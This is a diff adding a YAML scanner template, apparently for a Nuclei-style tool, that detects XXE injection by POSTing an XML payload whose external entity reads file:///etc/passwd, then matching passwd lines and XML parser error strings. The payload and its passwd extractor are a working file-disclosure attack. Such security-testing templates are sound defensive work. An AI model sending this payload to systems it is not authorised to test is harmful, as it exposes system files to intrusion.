@@ -1,0 +1,84 @@
+id: xxe-injection
+name: XML External Entity (XXE) Injection
+version: 1.0
+author: Phantom Team
+severity: critical
+description: >
+  Detects XXE injection by sending a crafted XML payload with an external
+  entity referencing /etc/passwd. Checks for successful file content
+  disclosure as well as XML parser error messages that indicate the
+  application processes XML entities.
+
+info:
+  cwe-id: CWE-611
+  cvss-score: 9.1
+
+tags:
+  - xxe
+  - injection
+  - xml
+  - file-disclosure
+
+references:
+  - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+
+requests:
+  - method: POST
+    path:
+      - "/"
+      - "/api"
+      - "/upload"
+      - "/xml"
+      - "/soap"
+      - "/xmlrpc.php"
+
+    redirects: false
+
+    headers:
+      Content-Type: "application/xml"
+
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+      <root>&test;</root>
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+        condition: or
+
+      - type: word
+        words:
+          - "simplexml_load_string"
+          - "parser error :"
+          - "xmlParseEntityDecl"
+          - "xmlParseInternalSubset"
+          - "DOCTYPE improperly terminated"
+          - "Start tag expected"
+          - "failed to load external entity"
+          - "Invalid URI: file:"
+          - "Malformed declaration expecting version"
+          - "Content is not allowed in prolog"
+          - "org.xml.sax"
+          - "SAXParseException"
+          - "com.sun.org.apache.xerces"
+          - "ParseError"
+          - "nokogiri"
+          - "REXML"
+          - "XML syntax error on line"
+          - "Error unmarshaling XML"
+          - "XML Parsing Error"
+          - "SyntaxError"
+          - "no root element"
+          - "not well-formed"
+          - "could not be parsed from XML"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: passwd_content
+        regex:
+          - "(root:.*:0:0:[^:]*:[^:]*:[^\\n]+)"
+        group: 1
